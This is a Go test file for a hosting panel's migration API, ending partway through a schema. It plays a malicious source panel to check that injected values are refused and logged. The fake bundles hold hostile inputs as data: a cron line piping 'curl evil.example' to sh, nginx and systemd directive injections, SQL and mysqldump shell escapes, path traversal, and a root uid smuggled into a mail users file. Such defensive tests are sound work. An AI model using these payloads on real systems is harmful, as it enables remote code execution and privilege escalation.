package api

import (
	"archive/tar"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"database/sql"
	"encoding/json"
	"encoding/pem"
	"io"
	"math/big"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"monopanel/internal/agent"
	"monopanel/internal/apitypes"
	"monopanel/internal/auth"
	"monopanel/internal/config"
	"monopanel/internal/store"
)

// fakeMonoPanel is a MonoPanel source that says whatever the test wants: the
// plan endpoint (no secrets) serves one bundle, the state endpoint — what the
// run imports — another, so a test can play a source that changes its story
// between the plan and the run.
type fakeMonoPanel struct {
	mu          sync.Mutex
	plan, state *apitypes.MigrationBundle
	dump        string
	ts          *httptest.Server
	// onFiles runs when the run asks for the account's files: after its
	// checks, before anything but the account is created.
	onFiles func()
	// files lists the parts asked for: home, mail:<domain>.
	files []string
}

func newFakeMonoPanel(t *testing.T) *fakeMonoPanel {
	t.Helper()
	f := &fakeMonoPanel{}
	f.ts = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		defer f.mu.Unlock()
		switch r.URL.Path {
		case "/api/v1/migrate/plan":
			json.NewEncoder(w).Encode(f.plan) //nolint:errcheck // test double
		case "/api/v1/migrate/state":
			json.NewEncoder(w).Encode(f.state) //nolint:errcheck // test double
		case "/api/v1/migrate/files":
			part := r.URL.Query().Get("part")
			if part == "mail" {
				f.files = append(f.files, "mail:"+r.URL.Query().Get("domain"))
			} else {
				f.files = append(f.files, part)
				if f.onFiles != nil {
					f.onFiles()
				}
			}
			tw := tar.NewWriter(w)
			if part == "mail" {
				// A Maildir with the sieve link managesieve keeps, and a
				// mailbox that is a link to another domain's Maildir.
				tw.WriteHeader(&tar.Header{Name: "info/", Typeflag: tar.TypeDir, Mode: 0o700})                                                //nolint:errcheck // test double
				tw.WriteHeader(&tar.Header{Name: "info/.dovecot.sieve", Typeflag: tar.TypeSymlink, Linkname: "sieve/managesieve.sieve"})      //nolint:errcheck // test double
				tw.WriteHeader(&tar.Header{Name: "boss", Typeflag: tar.TypeSymlink, Linkname: "/var/mail/monopanel/victim.example.org/boss"}) //nolint:errcheck // test double
				tw.Close()
				return
			}
			// The account's files, and a copy of /dev/mem among them.
			tw.WriteHeader(&tar.Header{Name: "data/www/good.example.org/index.php", Typeflag: tar.TypeReg, Mode: 0o644, Size: 6})             //nolint:errcheck // test double
			tw.Write([]byte("<?php\n"))                                                                                                       //nolint:errcheck // test double
			tw.WriteHeader(&tar.Header{Name: "data/www/good.example.org/mem", Typeflag: tar.TypeChar, Devmajor: 1, Devminor: 1, Mode: 0o666}) //nolint:errcheck // test double
			tw.Close()
		case "/api/v1/migrate/dump":
			io.WriteString(w, f.dump) //nolint:errcheck // test double
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(f.ts.Close)
	return f
}

func (f *fakeMonoPanel) request() map[string]any {
	return map[string]any{"source": f.ts.URL, "token": "made-up-grant-token", "scope": "user:evil"}
}

// testCert makes a self-signed certificate and its key for the names.
func testCert(t *testing.T, names ...string) (cert, key string) {
	t.Helper()
	dir := t.TempDir()
	cp, kp := filepath.Join(dir, "c.pem"), filepath.Join(dir, "k.pem")
	if _, err := EnsureSelfSigned(cp, kp, names); err != nil {
		t.Fatal(err)
	}
	c, _ := os.ReadFile(cp)
	k, _ := os.ReadFile(kp)
	return string(c), string(k)
}

// evilBundle is the account "evil" as a source tells it: a clean part every
// test expects to arrive, and — with bad — one item of every kind with a value
// the panel would refuse from a person. secrets adds what /migrate/state adds.
func evilBundle(t *testing.T, bad, secrets bool) *apitypes.MigrationBundle {
	t.Helper()
	quota := 2048
	b := &apitypes.MigrationBundle{
		Panel: "MonoPanel 0.8.19", Hostname: "old.example.net", Family: "debian", Scope: "user:evil",
		User:      &store.User{Login: "evil", Role: store.RoleUser, Email: "evil@example.org", Home: "/var/www/evil", QuotaMB: &quota},
		SiteNginx: map[string]string{"good.example.org": "access_log /etc/cron.d/pwn main;\n"},
		Sizes:     apitypes.MigrationSizes{Databases: map[string]int64{}},
		Notes:     []string{"a note with \x1b[31ma terminal escape\x1b[0m"},
	}
	b.Sites = []*store.Site{
		{Domain: "good.example.org", Aliases: []string{"Alias.Good.example.org", "www.good.example.org"}, Mode: store.ModeFPM, PHPVersion: "8.4", SSL: "none", HTTP2: true,
			IP: "198.51.100.7", IPv6: "2001:db8::77", PHPIni: map[string]string{"memory_limit": "256M"}, ClientMaxBody: "64m", AllowFrom: []string{"203.0.113.0/24"}, Preset: presetWordPress},
		{Domain: "shop.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", SSL: "auto"},
	}
	cleanDB := &store.Database{Name: "evil_db", Charset: "utf8mb4", Collation: "utf8mb4_0900_ai_ci", Users: []*store.DBUser{{Name: "evil_u", Host: "localhost"}, {Name: "evil_ro", Host: "localhost"}}}
	b.Databases = []*store.Database{cleanDB}
	b.Cron = []*store.CronJob{{Schedule: "*/5 * * * *", Command: "php /var/www/evil/data/www/good.example.org/cron.php", Comment: "wp", Enabled: true}}
	b.Apps = []*store.App{{Name: "web", Command: "/var/www/evil/data/app/run --port 5000", WorkDir: "/var/www/evil/data/app", Env: []string{"PORT=5000"}, Restart: "always"}}
	b.Valkey = []*store.ValkeyInstance{{Purpose: store.ValkeyCache, MemoryMB: 128}}
	priv, pub, err := newDKIMKey()
	if err != nil {
		t.Fatal(err)
	}
	b.MailDomains = []*store.MailDomain{{ID: 1, Name: "evil.example.org", Active: true, DKIMSelector: "mp20261121", DKIMPublic: pub}}
	b.Mailboxes = []*store.Mailbox{{DomainID: 1, LocalPart: "info", Address: "info@evil.example.org", QuotaMB: 512, Active: true}}
	b.MailAliases = []*store.MailAlias{{DomainID: 1, Source: "sales", Address: "sales@evil.example.org", Destination: "info@evil.example.org", Active: true}}
	goodCert, goodKey := testCert(t, "good.example.org", "www.good.example.org")
	b.Certificates = []apitypes.MigrationCert{{Name: "good.example.org", Names: []string{"good.example.org", "www.good.example.org"}, Kind: store.CertKindCustom, Files: true}}

	var badCert, badKey string
	if bad {
		badCert, badKey = testCert(t, "shop.example.org", "victim.example.org")
		b.Sites = append(b.Sites,
			&store.Site{Domain: "Bad.Example.org", Mode: store.ModeFPM, PHPVersion: "8.4"},
			&store.Site{Domain: "docroot.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", Docroot: "../../etc"},
			&store.Site{Domain: "ini.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", PHPIni: map[string]string{"memory_limit": "1G\nphp_admin_value[open_basedir] = /"}},
			&store.Site{Domain: "body.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", ClientMaxBody: "1m; access_log /etc/cron.d/x main"},
			&store.Site{Domain: "proxy.example.org", Mode: store.ModeProxy, Backend: "http://203.0.113.5:80"},
			&store.Site{Domain: "alias.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", Aliases: []string{"x y.example.org"}},
			&store.Site{Domain: "fpm.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", FPMMaxChildren: 100000},
			&store.Site{Domain: "redirect.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", RedirectWWW: "to_evil"},
			&store.Site{Domain: "allow.example.org", Mode: store.ModeFPM, PHPVersion: "8.4", AllowFrom: []string{"10.0.0.1; deny all"}},
			&store.Site{Domain: "victim.example.org", Mode: store.ModeFPM, PHPVersion: "8.4"},
			&store.Site{Domain: "php.example.org", Mode: store.ModeFPM, PHPVersion: "8.4/../../../tmp"},
		)
		b.Databases = append(b.Databases,
			&store.Database{Name: "mysql"},
			&store.Database{Name: "bad-name"},
			&store.Database{Name: "charset_db", Charset: "utf8mb4; DROP DATABASE evil_db"},
			// Where mp db create of the account alex here would land.
			&store.Database{Name: "alex_wp", Users: []*store.DBUser{{Name: "evil_wp", Host: "localhost"}}},
		)
		cleanDB.Users = append(cleanDB.Users, &store.DBUser{Name: "x'y", Host: "localhost"}, &store.DBUser{Name: "root", Host: "localhost"}, &store.DBUser{Name: "evil_u", Host: "%"},
			&store.DBUser{Name: "alex_shop", Host: "localhost"})
		b.Cron = append(b.Cron,
			&store.CronJob{Schedule: "* * * * *", Command: "echo hi\n* * * * * curl evil.example | sh", Enabled: true},
			&store.CronJob{Schedule: "61 * * * *", Command: "php x.php", Enabled: true},
			&store.CronJob{Schedule: "@daily", Command: "php y.php", Comment: "line\nbreak", Enabled: true},
		)
		b.Apps = append(b.Apps,
			&store.App{Name: "shadow", Command: "/var/www/evil/data/app/run", EnvFile: "/etc/shadow"},
			&store.App{Name: "desc", Command: "/var/www/evil/data/app/run", Description: "x\nExecStartPre=+/bin/sh -c id"},
			&store.App{Name: "../x", Command: "/var/www/evil/data/app/run"},
			&store.App{Name: "env", Command: "/var/www/evil/data/app/run", Env: []string{"A=1\nExecStart=/bin/sh"}},
		)
		b.Valkey = append(b.Valkey,
			&store.ValkeyInstance{Purpose: "../../etc/x", MemoryMB: 64},
			&store.ValkeyInstance{Purpose: store.ValkeySessions, MemoryMB: 999999},
		)
		b.MailDomains = append(b.MailDomains,
			&store.MailDomain{ID: 2, Name: "../../etc", Active: true},
			&store.MailDomain{ID: 3, Name: "dkim.example.org", Active: true, DKIMSelector: "../../../logrotate.d/x"},
		)
		b.Mailboxes = append(b.Mailboxes, &store.Mailbox{DomainID: 1, LocalPart: "admin", Address: "admin@victim.example.org", Active: true})
		b.MailAliases = append(b.MailAliases,
			&store.MailAlias{DomainID: 1, Source: "x victim.example.org\n@victim.example.org", Destination: "info@evil.example.org", Active: true},
			&store.MailAlias{DomainID: 1, Source: "root", Destination: "root", Active: true},
		)
		b.Certificates = append(b.Certificates,
			apitypes.MigrationCert{Name: "../../tls/x", Names: []string{"good.example.org"}, Files: true},
			apitypes.MigrationCert{Name: "shop.example.org", Names: []string{"shop.example.org", "victim.example.org"}, Kind: store.CertKindCustom, Files: true},
		)
	}
	if !secrets {
		return b
	}
	panelHash, _ := auth.HashPassword("evil-password")
	boxHash, _ := hashMailPassword("mailbox-password")
	b.Secrets = &apitypes.MigrationSecrets{
		PanelPassword: panelHash,
		UnixShadow:    "$y$j9T$evilsalt$evilhash",
		Mailboxes:     map[string]string{"info@evil.example.org": boxHash},
		DKIM:          map[string]string{"evil.example.org": priv},
		DBUsers: map[string]string{
			"evil_u@localhost":  "CREATE USER `evil_u`@`localhost` IDENTIFIED WITH 'mysql_native_password' AS '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29' REQUIRE NONE; GRANT ALL ON *.* TO 'evil_u'@'localhost' WITH GRANT OPTION",
			"evil_ro@localhost": "CREATE USER `evil_ro`@`localhost` IDENTIFIED WITH 'mysql_native_password' AS '*0123456789ABCDEF0123456789ABCDEF01234567'",
		},
	}
	b.Certificates[0].Cert, b.Certificates[0].Key = goodCert, goodKey
	if bad {
		// What only the run sees: hashes and keys of the source's choosing.
		b.Secrets.PanelPassword = "$argon2id$v=19$m=4194304,t=100,p=255$c2FsdHNhbHRzYWx0c2FsdA$aGFzaGhhc2hoYXNoaGFzaGhhc2hoYXNoaGFzaGhhc2g"
		b.Secrets.UnixShadow = "$6$salt$hash:0:0:root"
		b.Secrets.Mailboxes["info@evil.example.org"] = "{BLF-CRYPT}x:0:0::/etc::userdb_uid=0"
		other, _, _ := newDKIMKey()
		b.Secrets.DKIM["evil.example.org"] = other
		b.Secrets.DBUsers["evil_ro@localhost"] = "CREATE USER `evil_ro`@`localhost` IDENTIFIED WITH 'sha256_password' AS '$5$abc'"
		b.Certificates[len(b.Certificates)-1].Cert, b.Certificates[len(b.Certificates)-1].Key = badCert, badKey
	}
	return b
}

// issueWith finds an issue by kind, target and a part of its text.
func issueWith(list []apitypes.MigrationIssue, kind, target, text string) bool {
	for _, i := range list {
		if i.Kind == kind && i.Target == target && strings.Contains(i.Text, text) {
			return true
		}
	}
	return false
}

// newMigrationTarget is a panel ready to take everything a bundle may carry:
// PHP, MySQL, mail, Valkey, and a site of another account (victim.example.org).
func newMigrationTarget(t *testing.T) *siteFixture {
	t.Helper()
	fakeUnixAccounts(t)
	f := newMailFixture(t)
	f.installDB()
	f.installValkey(t)
	f.createSite(map[string]any{"domain": "victim.example.org", "user": "alex", "php_version": "8.4", "ssl": "none"})
	return f
}

// A malicious MonoPanel source: every value that would end up in a
// configuration file, a command, a path or the database is held to the rule a
// person meets typing it, and the plan names each one as a conflict.
func TestMigrationPlanRefusesMaliciousMonoPanelBundle(t *testing.T) {
	f := newMigrationTarget(t)
	src := newFakeMonoPanel(t)
	src.plan = evilBundle(t, true, false)

	var plan apitypes.MigrationPlan
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
	if plan.OK {
		t.Fatal("a plan with refused items must not be OK")
	}
	for _, want := range []struct{ kind, target, text string }{
		{"site", "Bad.Example.org", "not in the form the panel keeps names in"},
		{"site", "docroot.example.org", "invalid docroot"},
		{"site", "ini.example.org", `php_ini: invalid value for "memory_limit"`},
		{"site", "body.example.org", "client_max_body: expected string to match pattern"},
		{"site", "proxy.example.org", "the proxy mode needs a local backend"},
		{"site", "alias.example.org", "alias x y.example.org"},
		{"site", "fpm.example.org", "fpm_max_children: expected number <= 512"},
		{"site", "redirect.example.org", "redirect_www: expected value to be one of"},
		{"site", "allow.example.org", "is not an IP or CIDR"},
		{"site", "victim.example.org", "already served by this panel (owner alex)"},
		{"site", "php.example.org", "not a PHP branch the panel knows"},
		{"database", "mysql", "a system schema of MySQL"},
		{"database", "bad-name", "the name must match"},
		{"database", "charset_db", "are not MySQL names"},
		{"database", "evil_db", "account x'y@localhost: the name must match"},
		{"database", "evil_db", "account root@localhost: a system account"},
		{"database", "alex_wp", "names starting with alex_ are the databases of the account alex here"},
		{"database", "evil_db", "account alex_shop@localhost: names starting with alex_ are the database accounts of the account alex here"},
		{"cron", "* * * * * echo hi* * * * * curl evil.example | sh", "command must be one line"},
		{"cron", "61 * * * * php x.php", "schedule:"},
		{"cron", "@daily php y.php", "comment must not contain line breaks"},
		{"app", "shadow", "env_file must be an absolute path inside /var/www/evil"},
		{"app", "desc", "description must not contain line breaks"},
		{"app", "../x", "name: expected string to match pattern"},
		{"app", "env", "must look like KEY=value"},
		{"valkey", "../../etc/x", "the purpose must be cache or sessions"},
		{"valkey", "sessions", "memory_mb: expected number <= 8192"},
		{"mail", "../../etc", "domain must look like example.com"},
		{"mail", "dkim.example.org", "must be one DNS label"},
		{"mail", "admin@victim.example.org", "does not match its local part and domain (admin@evil.example.org)"},
		{"mail", "", "address must look like user@example.com"},
		{"mail", "", "recipient root: address must look like user@example.com"},
		{"cert", "../../tls/x", "not a valid hostname"},
	} {
		if !issueWith(plan.Conflicts, want.kind, want.target, want.text) {
			t.Errorf("no conflict %s %q %q", want.kind, want.target, want.text)
		}
	}
	for _, c := range plan.Conflicts {
		for _, clean := range []string{"good.example.org", "shop.example.org", "evil_db", "evil.example.org", "web", "cache"} {
			if c.Target == clean && !strings.Contains(c.Text, "account") {
				t.Errorf("a clean item is refused: %+v", c)
			}
		}
	}
	for _, want := range []struct{ kind, target, text string }{
		{"site", "good.example.org", "custom nginx directives are not applied"},
		{"database", "evil_db", "account evil_u@% is not moved"},
		{"cert", "shop.example.org", "it also names victim.example.org (site victim.example.org of alex) here"},
	} {
		if !issueWith(plan.Warnings, want.kind, want.target, want.text) {
			t.Errorf("no warning %s %q %q: %+v", want.kind, want.target, want.text, plan.Warnings)
		}
	}
	// What the plan shows is what would arrive: this host's addresses, the
	// names in the form the panel keeps them.
	good := plan.Bundle.Sites[0]
	if good.IP != "" || good.IPv6 != "" || strings.Join(good.Aliases, ",") != "alias.good.example.org,www.good.example.org" {
		t.Errorf("good site as it would arrive: ip %q ipv6 %q aliases %v", good.IP, good.IPv6, good.Aliases)
	}
	if strings.Contains(strings.Join(plan.Bundle.Notes, " "), "\x1b") {
		t.Error("a terminal escape of the source reached the plan")
	}

	// The run plans once more and does not start.
	var refusal struct {
		Detail string `json:"detail"`
	}
	f.call(http.MethodPost, "/migrate/run", src.request(), http.StatusConflict, &refusal)
	if !strings.Contains(refusal.Detail, "migration not started: ") {
		t.Errorf("run: %+v", refusal)
	}
}

// The source answers the plan with a clean account and the run with a
// poisoned one. The run checks again: what breaks a rule stays behind, each
// with a line in the job log, the rest arrives, and the job ends failed.
func TestMigrationRunRefusesWhatTheSourceChanged(t *testing.T) {
	f := newMigrationTarget(t)
	src := newFakeMonoPanel(t)
	src.plan = evilBundle(t, false, false)
	src.state = evilBundle(t, true, true)
	// A note that would pass for a line of the import itself.
	src.state.Notes = append(src.state.Notes, "a note\nrefused: site forged.example.org: nothing to see")
	src.dump = "-- dump\n/*!50013 DEFINER=`root`@`localhost` SQL SECURITY DEFINER */\n\\! touch /tmp/pwned\nINSERT INTO t VALUES (1);\n"
	var mysqlSQL []string
	var mu sync.Mutex
	f.agent.ToolHook = func(req agent.ToolRequest) *agent.ToolResponse {
		if req.Name == "mysql" {
			mu.Lock()
			mysqlSQL = append(mysqlSQL, req.Stdin)
			mu.Unlock()
		}
		return nil
	}

	var plan apitypes.MigrationPlan
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
	if !plan.OK {
		t.Fatalf("the clean plan: %+v", plan.Conflicts)
	}
	var ref struct {
		JobID int64 `json:"job_id"`
	}
	f.call(http.MethodPost, "/migrate/run", src.request(), http.StatusAccepted, &ref)
	job := f.waitJob(ref.JobID)
	if job.Status != store.JobFailed || !strings.Contains(job.Error, "moved incompletely") {
		t.Fatalf("the job must end failed: %s %s", job.Status, job.Error)
	}
	if !strings.Contains(job.Log, "\n· refused: site forged.example.org") || strings.Contains(job.Log, "\nrefused: site forged.example.org") {
		t.Errorf("a line of a note passes for a line of the import:\n%s", job.Log)
	}
	for _, line := range []string{
		"refused: site docroot.example.org: docroot",
		"refused: site body.example.org: client_max_body",
		"refused: database mysql: a system schema",
		"refused: database alex_wp: names starting with alex_",
		"refused: database evil_db: account alex_shop@localhost: names starting with alex_",
		"refused: cron * * * * * echo hi* * * * * curl evil.example | sh: command must be one line",
		"refused: app shadow: env_file",
		"refused: valkey ../../etc/x",
		"refused: mail ../../etc",
		"refused: account evil: panel password hash: argon2id parameters",
		"refused: account evil: unix password hash",
		"refused: mail info@evil.example.org: password hash: not a {BLF-CRYPT} hash",
		"refused: mail evil.example.org: the DKIM public key does not match the private key",
		"refused: database evil_db: account evil_ro@localhost: unsupported authentication plugin",
		"warning: database evil_db: account evil_u@% is not moved",
		"warning: cert shop.example.org: the certificate is not installed",
		"the panel password did not move",
		"mailbox info@evil.example.org arrives without its password",
		"mail evil.example.org arrives without its DKIM key",
		"custom nginx directives of the source are not applied",
		"home: 1 members of the source's archive left out (only files, directories and links inside the tree are taken), the first: data/www/good.example.org/mem",
		"mail: 1 members of the source's archive left out (only files, directories and links inside the tree are taken), the first: boss (a symlink to /var/mail/monopanel/victim.example.org/boss, outside its own directory)",
	} {
		if !strings.Contains(job.Log, line) {
			t.Errorf("job log lacks %q:\n%s", line, job.Log)
		}
	}

	// The clean part arrived, under the account and with the vetted values.
	u, err := f.db.GetUserByLogin(f.ctx, "evil")
	if err != nil || u.Status != store.UserActive {
		t.Fatalf("account: %+v %v", u, err)
	}
	if u.PasswordHash != "" || f.agent.Shadow["evil"] != "" {
		t.Errorf("refused hashes were set: panel %q, shadow %q", u.PasswordHash, f.agent.Shadow["evil"])
	}
	good, err := f.db.GetSiteByDomain(f.ctx, "good.example.org")
	if err != nil || good.UserID != u.ID || good.IPv6 != "" || good.Status == store.SiteError {
		t.Errorf("good site: %+v %v", good, err)
	}
	for _, refused := range []string{"docroot.example.org", "body.example.org", "ini.example.org", "proxy.example.org", "php.example.org"} {
		if _, err := f.db.GetSiteByDomain(f.ctx, refused); err == nil {
			t.Errorf("refused site %s was created", refused)
		}
	}
	if victim, _ := f.db.GetSiteByDomain(f.ctx, "victim.example.org"); victim == nil || victim.Login != "alex" {
		t.Errorf("the other account's site was touched: %+v", victim)
	}
	// Custom directives wait for a person next to custom.conf; nothing of
	// them is included by the server block.
	if c, ok := f.agent.FileContaining("good.example.org.d/custom.conf.migrated"); !ok || !strings.Contains(c, "access_log /etc/cron.d/pwn main;") || !strings.Contains(c, "NOT applied") {
		t.Errorf("custom directives kept for review: %q %v", c, ok)
	}
	for _, p := range f.agent.Files() {
		if strings.HasSuffix(p, "good.example.org.d/custom.conf") {
			t.Errorf("the source's directives were applied: %s", p)
		}
	}
	cron, _ := f.db.ListCronJobs(f.ctx, u.ID)
	if len(cron) != 1 || cron[0].Command != "php /var/www/evil/data/www/good.example.org/cron.php" {
		t.Errorf("cron: %+v", cron)
	}
	apps, _ := f.db.ListApps(f.ctx, u.ID)
	if len(apps) != 1 || apps[0].Name != "web" || apps[0].Enabled {
		t.Errorf("apps: %+v", apps)
	}
	vk, _ := f.db.ListValkey(f.ctx, u.ID)
	if len(vk) != 1 || vk[0].Purpose != store.ValkeyCache {
		t.Errorf("valkey: %+v", vk)
	}

	// Mail: the address is built here, never taken from the source; a refused
	// hash leaves a password nobody knows, not an empty field.
	users, _ := f.agent.File(dovecotUsers)
	if !strings.Contains(users, "info@evil.example.org:{BLF-CRYPT}$2a$11$") {
		t.Errorf("mailbox line: %q", users)
	}
	for _, forged := range []string{"victim", "userdb_uid=0", "admin@"} {
		if strings.Contains(users, forged) {
			t.Errorf("forged entry %q in the dovecot users file:\n%s", forged, users)
		}
	}
	boxes, _ := f.db.ListMailboxes(f.ctx, 0, 0)
	for _, b := range boxes {
		if b.Address != "info@evil.example.org" && strings.HasSuffix(b.Address, "@evil.example.org") {
			t.Errorf("refused mailbox created: %+v", b)
		}
	}
	if d, err := f.db.GetMailDomain(f.ctx, "evil.example.org"); err != nil || d.DKIMSelector != "" || d.DKIMKeyEnc != "" {
		t.Errorf("a domain with a refused DKIM key must arrive without DKIM: %+v %v", d, err)
	}
	for _, p := range f.agent.Files() {
		if strings.Contains(p, "logrotate.d/x") || strings.Contains(p, "/etc/x") {
			t.Errorf("a path of the source's choosing was written: %s", p)
		}
	}

	// Databases: statements built here from vetted parts. The dump is loaded
	// as the database's account with the client's commands off.
	mu.Lock()
	all := strings.Join(mysqlSQL, "\n")
	mu.Unlock()
	for _, want := range []string{
		"CREATE DATABASE `evil_db` CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;",
		"CREATE USER 'evil_u'@'localhost' IDENTIFIED WITH auth_socket AS 'root';\nGRANT ALL PRIVILEGES ON `evil\\_db`.* TO 'evil_u'@'localhost';",
		"ALTER USER 'evil_u'@'localhost' IDENTIFIED WITH mysql_native_password AS '*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29';",
	} {
		if !strings.Contains(all, want) {
			t.Errorf("mysql lacks %q:\n%s", want, all)
		}
	}
	// "ON `evil_db`.*" would also open evilXdb: the underscore of a grant
	// is a wildcard unless escaped.
	for _, never := range []string{"*.*", "WITH GRANT OPTION", "DROP DATABASE", "charset_db", "`mysql`", "'root'@", "x'y", "evil_ro", "ON `evil_db`", "alex_wp", "alex_shop"} {
		if strings.Contains(all, never) {
			t.Errorf("mysql ran %q:\n%s", never, all)
		}
	}
	var loads int
	for _, st := range f.agent.Streams() {
		if st.Direction == "in" && st.Name == "mysql" {
			loads++
			if got := strings.Join(st.Args, " "); got != "--protocol=socket --binary-mode --local-infile=0 --user=evil_u evil_db" {
				t.Errorf("dump loaded with %s", got)
			}
		}
	}
	if loads != 1 {
		t.Errorf("dump loads: %d", loads)
	}

	// Certificates: the clean one installed for the account; the one that
	// also names another account's site, and the one with a path for a name,
	// are not.
	c, err := f.db.GetCertificateByName(f.ctx, "good.example.org")
	if err != nil || c.UserID == nil || *c.UserID != u.ID || c.Kind != store.CertKindCustom {
		t.Errorf("good certificate: %+v %v", c, err)
	}
	if _, err := f.db.GetCertificateByName(f.ctx, "shop.example.org"); err == nil {
		t.Error("a certificate naming another account's site was installed")
	}
}

// The account itself: a source cannot pick a login nobody asked for, take an
// existing unix account over, or slip in a login unix would not take.
func TestMigrationRefusesAccountTakeover(t *testing.T) {
	f := newMigrationTarget(t)
	src := newFakeMonoPanel(t)

	// Asked for user:evil, the source answers with another account.
	b := evilBundle(t, false, false)
	b.User.Login = "mysql"
	src.plan = b
	var plan apitypes.MigrationPlan
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
	if plan.OK || !issueWith(plan.Conflicts, "account", "mysql", `answered with the account "mysql" instead of the requested evil`) {
		t.Errorf("another login: %+v", plan.Conflicts)
	}

	// A unix account of this host (a system user) is never adopted.
	fakeUnixAccounts(t, "mysql", "evil")
	src.plan = evilBundle(t, false, false)
	plan = apitypes.MigrationPlan{}
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
	if plan.OK || !issueWith(plan.Conflicts, "user", "evil", "a unix user or group with this name already exists") {
		t.Errorf("unix account: %+v", plan.Conflicts)
	}
	var refusal struct {
		Detail string `json:"detail"`
	}
	f.call(http.MethodPost, "/migrate/run", src.request(), http.StatusConflict, &refusal)
	if !strings.Contains(refusal.Detail, "evil: a unix user or group with this name already exists") {
		t.Errorf("run: %+v", refusal)
	}
	if _, err := f.db.GetUserByLogin(f.ctx, "evil"); err == nil {
		t.Error("the account was created")
	}

	// Nor an account the panel's services will run as once they are
	// installed: the grant command of the source names the login, and a
	// later mail or nginx install would adopt it (vmail owns every Maildir).
	fakeUnixAccounts(t)
	for _, login := range []string{"vmail", "nginx", "postfix", "monopanel-web"} {
		b := evilBundle(t, false, false)
		b.User.Login, b.Scope = login, "user:"+login
		src.plan = b
		req := src.request()
		req["scope"] = "user:" + login
		plan = apitypes.MigrationPlan{}
		f.call(http.MethodPost, "/migrate/plan", req, http.StatusOK, &plan)
		if plan.OK || !issueWith(plan.Conflicts, "user", login, "the name of a system account or group the panel's services use") {
			t.Errorf("service login %s: %+v", login, plan.Conflicts)
		}
	}
	src.plan = evilBundle(t, false, false)
	req := src.request()
	req["as"] = "vmail"
	plan = apitypes.MigrationPlan{}
	f.call(http.MethodPost, "/migrate/plan", req, http.StatusOK, &plan)
	if plan.OK || plan.Login != "vmail" || !issueWith(plan.Conflicts, "user", "vmail", "the name of a system account or group") {
		t.Errorf("--as vmail: %s %+v", plan.Login, plan.Conflicts)
	}

	// A foreign source whose scope names a login unix would not take.
	b = evilBundle(t, false, false)
	b.User.Login, b.Scope = "Evil Login", "user:Evil Login"
	src.plan = b
	req = src.request()
	req["scope"] = "user:Evil Login"
	plan = apitypes.MigrationPlan{}
	f.call(http.MethodPost, "/migrate/plan", req, http.StatusOK, &plan)
	if plan.OK || !issueWith(plan.Conflicts, "user", "Evil Login", "the login does not suit a unix account") {
		t.Errorf("bad login: %+v", plan.Conflicts)
	}

	// The account's own fields follow the users-create rules too.
	b = evilBundle(t, false, false)
	negative := -1
	b.User.Email, b.User.QuotaMB = "not an address", &negative
	src.plan = b
	plan = apitypes.MigrationPlan{}
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
	if plan.OK || !issueWith(plan.Conflicts, "account", "evil", "email:") || !issueWith(plan.Conflicts, "account", "evil", "quota_mb:") {
		t.Errorf("account fields: %+v", plan.Conflicts)
	}
}

// An empty entry in a list of the bundle is a conflict, not a crash.
func TestMigrationPlanRefusesEmptyEntries(t *testing.T) {
	f := newMigrationTarget(t)
	src := newFakeMonoPanel(t)
	b := evilBundle(t, false, false)
	b.Sites = append(b.Sites, nil)
	b.Mailboxes = append(b.Mailboxes, nil)
	src.plan = b
	var plan apitypes.MigrationPlan
	f.call(http.MethodPost, "/migrate/plan", src.request(), http.StatusOK, &plan)
	if plan.OK || !issueWith(plan.Conflicts, "site", "", "empty site entry") || !issueWith(plan.Conflicts, "mail", "", "empty mailbox entry") {
		t.Errorf("empty entries: %+v", plan.Conflicts)
	}
	if v := f.s.vetBundle(f.ctx, apitypes.MigrationSourceRequest{}, &apitypes.MigrationBundle{}, "evil"); !v.account || len(v.conflicts) != 1 {
		t.Errorf("a bundle without an account: %+v", v.conflicts)
	}
}

// buildFastpanelDB builds a FASTPANEL database file with the schema the adapter
// reads and returns its bytes, as python3 on the source would send them.
func buildFastpanelDB(t *testing.T, rows ...string) string {
	t.Helper()
	file := filepath.Join(t.TempDir(), "fastpanel2.db")
	db, err := sql.Open("sqlite", file)
	if err != nil {
		t.Fatal(err)
	}
	schema := []string{
		`CREATE TABLE panel_account (id INTEGER PRIMARY KEY, username TEXT, home_dir TEXT, ssh_access NUMERIC, quota_value INTEGER)`,
		`CREATE TABLE site (id INTEGER PRIMARY KEY, domain TEXT, index_dir TEXT, https_redirect NUMERIC, http2 NUMERIC, certificate_id INTEGER, status TEXT, manual_changes NUMERIC, owner_id INTEGER)`,
		`CREATE TABLE virtualhost_aliases (id INTEGER PRIMARY KEY, name TEXT, site_id INTEGER)`,
		`CREATE TABLE website_backends (id INTEGER PRIMARY KEY, frontend_id INTEGER, main NUMERIC, handler TEXT, handler_version TEXT, type TEXT, addr TEXT, port INTEGER)`,
		`CREATE TABLE db (id INTEGER PRIMARY KEY, name TEXT, owner_id INTEGER)`,
		`CREATE TABLE database_user (id INTEGER PRIMARY KEY, login TEXT, owner_id INTEGER)`,
		`CREATE TABLE datbases_users (id INTEGER PRIMARY KEY, user_id INTEGER, database_id INTEGER)`,
		`CREATE TABLE certificate (id INTEGER PRIMARY KEY, name TEXT, certificate TEXT, chain TEXT, private_key TEXT, type TEXT, enabled NUMERIC)`,
		`CREATE TABLE virtualhost_configuration (id INTEGER PRIMARY KEY, virtualhost_id INTEGER, frontend TEXT)`,
